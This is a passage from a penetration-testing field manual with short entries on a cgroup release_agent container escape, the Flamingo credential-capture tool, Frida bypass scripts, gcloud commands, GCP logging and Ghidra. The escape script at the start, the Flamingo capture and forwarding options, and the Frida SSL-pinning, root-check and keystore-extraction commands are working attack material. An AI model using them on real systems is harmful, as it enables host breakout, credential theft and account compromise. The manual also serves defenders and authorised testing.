mkdir /tmp/cgrp/x 
echo 1 > /tmp/cgrp/x/notify_on_release 
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` 
echo "$host_path/cmd" > /tmp/cgrp/release_agent 
echo '#!/bin/sh' > /cmd 
echo "ps aux > $host_path/output" >> /cmd 
chmod a+x /cmd 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 
65 
REFERENCE: 
https://blog.trailofbits.com/2019/07/19/understanding-docker-container-
escapes/ 
F 
F
F 
FLAMINGO 
RED TEAM 
ESCALATE PRIV 
WINDOWS/LINUX 
Flamingo captures credentials sprayed across the network by various 
IT and security products. Currently supports SSH, HTTP, LDAP, DNS, 
FTP, and SNMP credential collection. 
Flamingo binary from the releases page or build from source. 
$ GOOS=win32 GOARCH=amd64 go build -o flamingo.exe 
$ go get -u -v github.com/atredispartners/flamingo && \ 
  go install -v github.com/atredispartners/flamingo && \ 
  $GOPATH/bin/flamingo 
Run the binary and collect credentials 
C:\> flamingo.exe 
{"_etime":"2020-01-
10T17:56:51Z","_host":"1.2.3.4:18301","_proto":"ssh","method":"pubk
ey","pubkey":"ssh-ed25519 
AAAAC3NzaC1lZDI1NTE5AAAAIPVSxqrWfNle0nnJrKS3NA12uhu9PHxnP4OlD843tRz
66 
/","pubkey-
sha256":"SHA256:/7UkXjk0XtBe9N6RrAGGgJTGuKKi1Hgk3E+4TPo54Cw","usern
ame":"devuser","version":"SSH-2.0-OpenSSH_for_Windows_7.7"} 
{"_etime":"2020-01-
10T17:56:52Z","_host":"1.2.3.4:1361","_proto":"ssh","method":"passw
ord","password":"SuperS3kr3t^!","username":"root","version":"SSH-
2.0-OpenSSH_for_Windows_7.7"} 
{"_etime":"2020-01-
10T17:56:53Z","_host":"1.2.3.4:9992","_proto":"ssh","method":"passw
ord","password":"DefaultPotato","username":"vulnscan-
a","version":"SSH-2.0-OpenSSH_for_Windows_7.7"} 
**Default log credentials to standard output & append to 
flamingo.log in working directory. 
Options 
--protocols to configure a list of enabled protocol listeners 
Use additional options to specify ports and protocol options for 
listeners. 
All additional command-line arguments are output destinations. 
Outputs 
Flamingo can write recorded credentials to a variety of output 
formats. By default, flamingo will log to flamingo.log and standard 
output. 
Standard Output 
Specifying - or stdout will result in flamingo only logging to 
standard output. 
File Destinations 
Specifying one or more file paths will result in flamingo appending 
to these files. 
HTTP Destinations 
Specifying HTTP or HTTPS URLs will result in flamingo sending a 
webhook POST request to each endpoint. By default, this format 
supports platforms like Slack and Mattermost that support inbound 
webhooks. 
The actual HTTP POST looks like: 
POST /specified-url 
Content-Type: application/json 
User-Agent: flamingo/v0.0.0 
{"text": "full-json-output of credential report"} 
Syslog Destinations 
67 
Specifying syslog or syslog: will result in flamingo 
sending credentials to a syslog server. 
The following formats are supported: 
• 
syslog - send to the default syslog output, typically a 
unix socket 
• 
syslog:unix:/dev/log - send to a specific unix stream 
socket 
• 
syslog:host - send to the specified host using udp and port 
514 
• 
syslog:host:port - send to the specified host using udp and 
the specified port 
• 
syslog:udp:host - send to the specified host using udp and 
port 514 
• 
syslog:udp:host:port - send to the specified host using udp 
and the specified port 
• 
syslog:tcp:host - send to the specified host using tcp and 
port 514 
• 
syslog:tcp:host:port - send to the specified host using tcp 
and the specified port 
• 
syslog:tcp+tls:host - send to the specified host using tls 
over tcp and port 514 
• 
syslog:tcp+tls:host:port - send to the specified host using 
tls over tcp and the specified port 
REFERENCE: 
https://www.atredis.com/blog/2020/1/26/flamingo-captures-credentials 
https://github.com/atredispartners/flamingo 
https://github.com/atredispartners/flamingo/releases 
F
F 
FRIDA 
RED TEAM 
VULNERABILITY 
ALL 
Frida is a dynamic code instrumentation toolkit. Lets you inject 
snippets of JavaScript or your own library into native apps on 
Windows, macOS, GNU/Linux, iOS, Android, QNX. 
Listing frida available devices 
frida-ls-devices 
Getting frida server running on device 
download latest binary from frida releases 
adb shell "su -c 'chmod 755 /data/local/tmp/frida-server'" 
adb shell "su -c '/data/local/tmp/frida-server' &" 
Trace open calls in chrome 
68 
frida-trace -U -i open com.android.chrome 
FRIDA-CLI 
Connect to application and start debugging 
frida -U  
Loading a script 
frida Calculator -l calc.js 
#add --debug for more debugging symbols 
Connect and list running processes 
frida-ps -U 
Connect and list running applications 
frida-ps -Ua 
Connect and list installed applications 
frida-ps -Uai 
Connect to specific device 
frida-ps -D 0216027d1d6d3a03 
If/when troubleshooting brida to frida bridge 
frida -U -f com.htbridge.pivaa -l ~/bin/proxies/scriptBrida.js --
no-pause  
NOTE: Turn off magisk hiding in settings as this causes issue with 
brida and frida link. 
iOS 
NOTE: For non-jailbroken iPhones, frida gadget technique is way to 
go. Recompile app with embedded frida gadget 
iOS getting list of applications 
#run this on the device 
ipainstaller -l > applist.txt 
Get active window 
w = ObjC.classes.UIWindow.keyWindow() 
#This returns an address such as: 0xd43321 
#Now drill into this window with: 
desc = w.recursiveDescription().toString() 
Refactor into one-liner: 
frida -q -U evilapp -e 
"ObjC.classes.UIWindow.keyWindow().recursiveDescription() 
69 
 .toString;" | grep "UILabel.*hidden*"" 
FRIDA SCRIPTS 
SSL pinning bypass (android - via frida codeshare) 
frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-
with-frida -f YOUR_BINARY 
frida --codeshare segura2010/android-certificate-pinning-bypass -f 
YOUR_BINARY 
frida --codeshare sowdust/universal-android-ssl-pinning-bypass-2 -f 
YOUR_BINARY 
Anti-root bypass (android - via frida codeshare) 
frida --codeshare dzonerzy/fridantiroot -f YOUR_BINARY 
Obj-C method observer 
frida --codeshare mrmacete/objc-method-observer -f YOUR_BINARY 
Get stack trace in your hook (android) 
frida --codeshare razaina/get-a-stack-trace-in-your-hook -f 
YOUR_BINARY 
Bypass network security config (android) 
frida --codeshare tiiime/android-network-security-config-bypass -f 
YOUR_BINARY 
Extract android keystore 
frida --codeshare ceres-c/extract-keystore -f YOUR_BINARY 
iOS backtrace http requests 
frida --codeshare SYM01/ios-backtrace-http-req -f YOUR_BINARY 
iOS trustkit SSL unpinning 
frida --codeshare platix/ios-trustkit-ssl-unpinning -f YOUR_BINARY 
iOS SSL bypass 
frida --codeshare lichao890427/ios-ssl-bypass -f YOUR_BINARY 
iOS 12 SSL bypass 
frida --codeshare machoreverser/ios12-ssl-bypass -f YOUR_BINARY 
iOS SSL pinning disable 
frida --codeshare snooze6/ios-pinning-disable -f YOUR_BINARY 
iOS & Android enumeration script 
70 
frida --codeshare snooze6/everything -f YOUR_BINARY 
REFERENCE: 
Twitter> @gh0s7 
https://frida.re/ 
https://github.com/frida/frida 
https://github.com/dweinstein/awesome-frida 
G 
G
G 
GCP CLI 
ALL 
ADMINISTRATION 
CLOUD 
gcloud CLI manages authentication, local configuration, developer 
workflow, and interactions with Google Cloud APIs. 
COMMAND 
DESCRIPTION 
BASICS 
https://cloud.google.com/sdk/gcloud/reference/ 
gcloud Doc 
https://cloud.google.com/storage/docs/gsutil 
gsutil 
Installation 
https://cloud.google.com/sdk/docs/quickstart-linux 
Installation 
gcloud version, gcloud info, gcloud components list 
Check version 
& settings 
gcloud init  
#This will ask you to open an OpenID URL 
Init profile 
gcloud compute zones list 
List all 
zones 
gcloud components update, gcloud components update -
-version 219.0.1 
Upgrade local 
SDK 
BUCKET BASICS 
71 
gsutil ls, gsutil ls -lh gs:// 
List all 
buckets and 
files 
gsutil cp gs:////package-
1.1.tgz . 
Download file 
gsutil cp  gs://// Upload file 
gsutil cat gs://// 
Cat file 
gsutil rm gs:/// 
Delete file 
gsutil mv  gs://// 
Move file 
gsutil cp -r ./conf gs:/// 
Copy folder 
gsutil du -h gs:// 
Show disk 
usage 
gsutil mb gs:// 
Create bucket 
gsha1sum syslog-migration-10.0.2.tgz, shasum syslog-
migration-10.0.2.tgz 
Caculate file 
sha1sum 
gsutil help, gsutil help cp, gsutil help options 
Gsutil help 
GCP PROJECT 
gcloud config list, gcloud config list project 
List projects 
gcloud compute project-info describe 
Show project 
info 
gcloud config set project  
Switch 
project 
GKE 
gcloud auth list 
Display a 
list of 
credentialed 
accounts 
gcloud config set account  
Set the 
active 
account 
gcloud container clusters get-credentials  
Set kubectl 
context 
gcloud config set compute/region us-west 
Change region 
gcloud config set compute/zone us-west1-b 
Change zone 
gcloud container clusters list 
List all 
container 
clusters 
IAM 
gcloud auth activate-service-account --key-file 
Authenticate 
client 
gcloud auth list 
Display a 
list of 
credentialed 
accounts 
gcloud config set account  
Set the 
active 
account 
72 
gcloud auth configure-docker 
Auth to GCP 
Container 
Registry 
gcloud auth print-access-token, gcloud auth print-
refresh-token 
Print token 
for active 
account 
gcloud auth  revoke 
Revoke 
previous 
generated 
credential 
BUCKET SECRURITY 
gsutil -m acl set -R -a public-read gs:/// 
Make all 
files 
readable 
gsutil config -a 
Config auth 
gsutil iam ch 
user:PI:EMAIL:objectCreator,objectViewer 
gs:// 
Grant bucket 
access 
gsutil iam ch -d 
user:PI:EMAIL:objectCreator,objectViewer 
gs:// 
Remove bucket 
access 
INSTANCE 
gcloud compute instances list, gcloud compute 
instance-templates list 
List all 
instances 
gcloud compute instances describe "" 
--project "" --zone "us-west2-a" 
Show instance 
info 
gcloud compute instances stop instance-2 
Stop an 
instance 
gcloud compute instances start instance-2 
Start an 
instance 
gcloud compute instances create vm1 --image image-1 
--tags test --zone "" --machine-type f1-micro 
Create an 
instance 
gcloud compute ssh --project "" --zone 
"" "" 
SSH to 
instance 
gcloud compute copy-files example-instance:~/REMOTE-
DIR ~/LOCAL-DIR --zone us-central1-a 
Download 
files 
gcloud compute copy-files ~/LOCAL-FILE-1 example-
instance:~/REMOTE-DIR --zone us-central1-a 
Upload files 
DISKS/VOLUMES 
gcloud compute disks list 
List all 
disks 
gcloud compute disk-types list 
List all disk 
types 
gcloud compute snapshots list 
List all 
snapshots 
gcloud compute disks snapshot  --
snapshotname  --zone $zone 
Create 
snapshot 
NETWORK 
gcloud compute networks list 
List all 
networks 
73 
gcloud compute networks describe  --
format json 
Detail of one 
network 
gcloud compute networks create  
Create 
network 
gcloud compute networks subnets create subnet1 --
network net1 --range 10.5.4.0/24 
Create subnet 
gcloud compute addresses create --region us-west2-a 
vpn-1-static-ip 
Get a static 
ip 
gcloud compute addresses list 
List all ip 
addresses 
gcloud compute addresses describe  --region 
us-central1 
Describe ip 
address 
gcloud compute routes list 
List all 
routes 
DNS 
gcloud dns record-sets list --zone my_zone 
List of all 
record-sets 
in myzone 
gcloud dns record-sets list --zone my_zone --
limit=10 
List first 10 
DNS records 
FIREWALL 
gcloud compute firewall-rules list 
List all 
firewall 
rules 
gcloud compute forwarding-rules list 
List all 
forwarding 
rules 
gcloud compute firewall-rules describe  
Describe one 
firewall rule 
gcloud compute firewall-rules create my-rule --
network default --allow tcp:9200 tcp:3306 
Create one 
firewall rule 
gcloud compute firewall-rules update default --
network default --allow tcp:9200 tcp:9300 
Update one 
firewall rule 
IMAGES/CONTAINERS 
gcloud compute images list 
List all 
images 
gcloud container clusters list 
List all 
container 
clusters 
gcloud container clusters get-credentials  
Set kubectl 
context 
RDS 
gcloud sql instances list 
List all sql 
instances 
SERVICES 
gcloud compute backend-services list 
List my 
backend 
services 
74 
gcloud compute http-health-checks list 
List all my 
health check 
endpoints 
gcloud compute url-maps list 
List all URL 
maps 
REFERENCE: 
https://cheatsheet.dennyzhang.com/cheatsheet-gcp-a4 
G
G 
GCP_Defend 
BLUE TEAM 
LOGGING 
CLOUD 
Security-related logs 
Logs provide a rich data set to help identify specific security 
events. Each of the following log sources might provide details 
that you can use in your analysis. 
Cloud Audit Logs 
Google Cloud services write audit logs called Cloud Audit Logs. 
These logs help you answer the questions, "Who did what, where, and 
when?" There are three types of audit logs for each project, 
folder, and organization: Admin Activity, Data Access, and System 
Event. These logs collectively help you understand what 
administrative API calls were made, what data was accessed, and 
what system events occurred. This information is critical for any 
analysis. For a list of Google Cloud services that provide audit 
logs, see Google services with audit logs. 
Cloud Audit Logs for GKE also exposes Kubernetes Audit Logging, 
which provides a chronological record of calls made to the 
Kubernetes API server. These logs are also collected in Cloud Audit 
Logs. 
App logs 
Stackdriver Logging collects your container standard output and 
error logs. You can add other logs by using the Sidecar approach. 
For clusters with Istio and Stackdriver enabled, the Istio 
Stackdriver adapter collects and reports the Istio-specific logs 
and sends the logs to Stackdriver Logging. 
Infrastructure logs 
Infrastructure logs offer insight into the activities and events at 
the OS, cluster, and networking levels. 
GKE audit logs 
75 
GKE sends two types of audit logs: GKE audit logs and Kubernetes 
Audit Logging. Kubernetes writes audit logs to Cloud Audit Logs for 
calls made to the Kubernetes API server. Kubernetes audit log 
entries are useful for investigating suspicious API requests, for 
collecting statistics, and for creating monitoring alerts for 
unwanted API calls. In addition, GKE writes its own audit logs that 
identify what occurs in a GKE cluster. 
Compute Engine Cloud Audit Logs for GKE nodes 
GKE runs on top of Compute Engine nodes, which generate their own 
audit logs. In addition, you can configure auditd to capture Linux 
system logs. auditd provides valuable information such as error 
messages, login attempts, and binary executions for your cluster 
nodes. Both the Compute Engine audit logs and the auditd audit logs 
provide insight into activities that happen at the underlying 
cluster infrastructure level. 
Container logs 
For container and system logs, GKE deploys a per-node logging agent 
that reads container logs, adds helpful metadata, and then stores 
the logs. The logging agent checks for container logs in the 
following sources: 
• 
Standard output and standard error logs from containerized 
processes 
• 
kubelet and container runtime logs 
• 
Logs for system components, such as VM startup scripts 
For events, GKE uses a deployment in the kube-system namespace that 
automatically collects events and sends them to Logging. Logs are 
collected for clusters, nodes, pods, and containers. 
Istio on Google Kubernetes Engine 
For clusters with Istio, the Istio Stackdriver adapter is installed 
during cluster creation, which sends metrics, logging, and trace 
data from your mesh to Stackdriver. 
Auditd for Container-Optimized OS on GKE 
For Linux systems, the auditd daemon provides access to OS system-
level commands and can provide valuable insight into the events 
inside your containers. On GKE, you can collect auditd logs and 
send them to Logging. 
VPC Flow Logs 
VPC Flow Logs records a sample of network flows sent from and 
received by VM instances. This information is useful for analyzing 
network communication. VPC Flow Logs includes all pod-to-pod 
traffic through the Intranode Visibility feature in your Kubernetes 
cluster. 
REFERENCE:  
76 
https://cloud.google.com/solutions/security-controls-and-forensic-analysis-
for-GKE-apps 
G
G 
GCP_Exploit 
RED TEAM 
EXPLOITATION 
CLOUD 
SCOUT 
Scout Suite is an open source multi-cloud security-auditing tool, 
which enables security posture assessment of cloud environments. 
STEP 1: Download and install Gcloud command-line tool: 
https://cloud.google.com/pubsub/docs/quickstart-cli 
STEP 2: Set the obtained target creds in your configuration: 
gcloud config set account  
STEP 3: Execute ‘scout’ using a user account or service account: 
$ python scout.py --provider gcp --user-account 
$ python scout.py --provider gcp --service-account --key-file 
/path/to/keyfile 
STEP 4: To scan a GCP account, execute either of the following: 
Organization: organization-id  
Folder: folder-id  
Project: project-id  
REFERENCE: 
https://github.com/puresec/awesome-serverless-security/#google-cloud-
functions-security 
https://github.com/nccgroup/ScoutSuite 
https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-
privileges-in-google-cloud-platform/ 
G
G 
GCP_Hardening 
BLUE TEAM 
CONFIGURATION 
CLOUD 
GKE Hardening Guide 
https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-
your-cluster 
77 
G
G 
GCP_Terms 
ALL 
INFORMATIONAL 
CLOUD 
Google Cloud Developers Cheat Sheet 
https://github.com/gregsramblings/google-cloud-4-words 
https://www.intelligencepartner.com/en/definitive-cheat-sheet-for-
google-cloud-products/ 
G
G 
GHIDRA 
RED/BLUE TEAM 
REVERSE ENGINEER 
BINARIES 
Ghidra is a software reverse engineering framework developed by NSA 
that is in use by the agency for more than a decade. Basically, a 
software reverse engineering tool helps to dig up the source code 
of a proprietary program which further gives you the ability to 
detect malware threats or potential bugs. 
PROJECT/PROGRAM 
SHORTCUT 
MENU 
New Project 
Ctrl+N 
File → New Project 
Open Project 
Ctrl+O 
File → Open Project 
Close Project1 